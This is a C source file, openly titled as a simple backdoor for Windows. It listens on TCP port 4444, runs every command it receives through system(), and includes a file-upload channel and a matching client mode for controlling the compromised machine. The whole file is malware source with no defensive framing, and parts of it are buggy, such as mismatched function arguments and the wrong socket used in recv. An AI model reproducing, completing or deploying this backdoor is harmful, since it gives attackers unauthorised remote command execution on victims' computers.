/*
 ****************************************************************
 * A simple backdoor for Windoze...                             *
 ****************************************************************
 */

#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>

#include <windows.h>
#include <winsock2.h>

#define MY_PORT 4444
#define PROGRAM_NAME "C:\\Windows\\system32\\cmd.exe"

#define TERMINATE(A, T, M) ({\
	if((T)) {\
		if(A == 0) fprintf(stderr, "[LINE:%d] [FILE:%s] : ERROR: %s\n", __LINE__, __FILE__, M);\
		else if(A == 1) fprintf(stderr, "[LINE:%d] [FILE:%s] : WARNING: %s\n", __LINE__, __FILE__, M);\
		else fprintf(stdout, "%s\n", M);\
		errno = 0;\
		goto error;\
	}\
})

enum _TERMINATE {
	TERMINATE_ERROR,
	TERMINATE_WARNING,
	TERMINATE_NORMAL
};

void pzero(p, s)
	char *p;
	size_t s;
{
	size_t i;
	for(i=0; i<s+1; ++i)
		*(p+i)=0;
}

#define MAXBUF 1024

/* upload_server() - this is what the client runs.
 */
void upload_server(filename, address)
	const char *filename;
	const char *address;
{
	int sockfd, clientfd;
	struct sockaddr_in server;
	char *name = strrchr(filename, '\\');
	FILE *fp=fopen(name, "rb");
	if(fp==NULL)
		return;

	pzero(&server, sizeof(server));
	server.sin_family = AF_INET;
	server.sin_port = htons(666);
	server.sin_addr.s_addr = inet_addr(address);

	TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0, strerror(errno));
	TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0, strerror(errno));
	TERMINATE(TERMINATE_ERROR, listen(sockfd, 1) < 0, strerror(errno));

	TERMINATE(TERMINATE_ERROR, (clientfd=accept(sockfd, (struct sockaddr*)NULL, NULL)) < 0, strerror(errno));

	while(1) {
		char buf[MAXBUF];
		int nread = fread(buf, 1, MAXBUF, fp);
		printf("Bytes read: %d\n", nread);

		/* If read was successful, send data. */
		if(nread > 0) {
			puts("Sending");
			if(send(sockfd, buf, MAXBUF, 0) < 0)
				puts("Error: sending data.");
		} else {
			if(feof(fp)==-1) puts("End of file...");
			if(ferror(fp)!=0) puts("Error reading file...");
			break;
		}
	}

error:
	fclose(fp);
	closesocket(sockfd);
}

char *nameget(filename)
	const char *filename;
{
	char string[128], *tmp = NULL;
	strcpy(string, filename);

	tmp = strtok(string, "\\");
	while((tmp=strtok(NULL, "\\")) != NULL);
	return tmp;
}

char *search_name(filename)
	char *filename;
{
	char *tmp = NULL;

	while(*++filename != 0)
		if(*filename == '\\')
			tmp = filename;
		else
			tmp = NULL;
	return tmp;
}

/* upload_client() - this is what the server runs.
 */
void upload_client(filename, address)
	const char *filename;
	const char *address;
{
	int sockfd, bytes;
	struct sockaddr_in server;
	char buf[MAXBUF];

	FILE *fp=fopen(search_name(filename), "wb");
	if(fp==NULL)
		return;

	pzero(buf, sizeof(buf));
	pzero(&server, sizeof(server));
	server.sin_family = AF_INET;
	server.sin_port = htons(666);
	server.sin_addr.s_addr = inet_addr(address);

	TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0, strerror(errno));
	TERMINATE(TERMINATE_ERROR, connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0, strerror(errno));

	while((bytes=recv(sockfd, buf, MAXBUF, 0))>0) {
		printf("Bytes received : %d\n", bytes);
		if((bytes=fwrite(buf, 1, bytes, fp)) > 0)
			printf("Bytes written : %d\n", bytes);
		pzero(buf, sizeof(buf));
	}

error:
	fclose(fp);
	closesocket(sockfd);
}

int main(argc, argv)
	int argc;
	char **argv;
{
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in self;

	sockfd = 0;
	WSAStartup(MAKEWORD(2, 0), &wsaData);

	if(argc < 2) {
	    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));

		/* Setup socket address struct */
		pzero(&self, sizeof(self));
		self.sin_family = AF_INET;
		self.sin_port = htons(MY_PORT);
		self.sin_addr.s_addr = INADDR_ANY;

		/* bind port to socket */
		TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
		/* listen for connections */
		TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));

		for(;;) {
			int clientfd;
			struct sockaddr_in client;
			int clientlen = sizeof(client);
			char message[256];
			char buf[MAXBUF];

			/* accept connection */
			clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
			if(clientfd>0) {
				void upload_client();
				int bytes;
				pzero(message, sizeof(message));
				sprintf(message, "%s:%u client connected.", inet_ntoa(client.sin_addr),
					client.sin_port);
				puts(message);
				do {
					if(send(clientfd, "CMD >> ", 8, 0) != 8)
						puts("Error: sending data.");
					bytes=recv(clientfd, buf, MAXBUF, 0);
					if(bytes>0) {
						if(strncmp(buf, "", 1)==0) {
							puts("Error: unknown command");
						}
						else if(strncmp(buf, "upload", 6)==0) {
								char filename[128];

								/* Zero filename buffer, copy data to it */
								pzero(filename, sizeof(filename));
								if(recv(sockfd, filename, sizeof(filename), 0) < 0)
									puts("Error receiving filename.");

								/* upload file */
								upload_client(filename);
						}
						else system(buf);
					} else if(bytes==0)
						puts("Nothing received.");
					else
						puts("Error: couldn't receive data.");
				} while(bytes > 0);
				if(closesocket(clientfd)==0) {
					pzero(message, sizeof(message));
					sprintf(message, "%s:%u client disconnected.", inet_ntoa(client.sin_addr),
						client.sin_port);
					puts(message);
				}
			}
		}
		closesocket(sockfd);
	} else if(argc == 2) {
		char buf[MAXBUF];
		TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
		pzero(&self, sizeof(self));
		self.sin_family = AF_INET;
		self.sin_port = htons(MY_PORT);
		self.sin_addr.s_addr = inet_addr(argv[1]);

        TERMINATE(0, connect(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));

        while(1) {
        	void upload_server();
        	char reply[MAXBUF];
        	pzero(buf, sizeof(buf)/sizeof(char));
        	pzero(reply, sizeof(reply)/sizeof(char));

        	fflush(stdin);
        	if((recv(sockfd, reply, MAXBUF, 0)) < 0)
        		puts("Could not recv data.");
        	scanf("%[^\n]s", buf);
        	if(strcmp(buf, "exit")==0) break;
        	else if(strcmp(buf, "upload")==0) {
				char filename[128];
				char address[64];

				/* Nullify char buffers initially */
				pzero(filename, sizeof(filename));
				strcpy(address, argv[1]);

				/* flush stdin and stdout */
				fflush(stdin);
				fflush(stdout);
				/* Get filename from user */
				printf("Enter filename: ");
				scanf("%[^\n]s", filename);

				/* Send filename to server */
				if(send(sockfd, filename, sizeof(filename), 0) < 0)
					puts("Error: sending filename.");

				/* Upload file to server */
				upload_server(filename, address);
			}
			if((send(sockfd, buf, MAXBUF, 0)) < 0)
				puts("Could not send data.");
        }
        closesocket(sockfd);
	} else {
		fprintf(stderr, "Usage: Backdoor.exe [Address]\n");
	}

	WSACleanup();
	return 0;

error:
	if(sockfd != 0) closesocket(sockfd);
	WSACleanup();
	return 1;
}
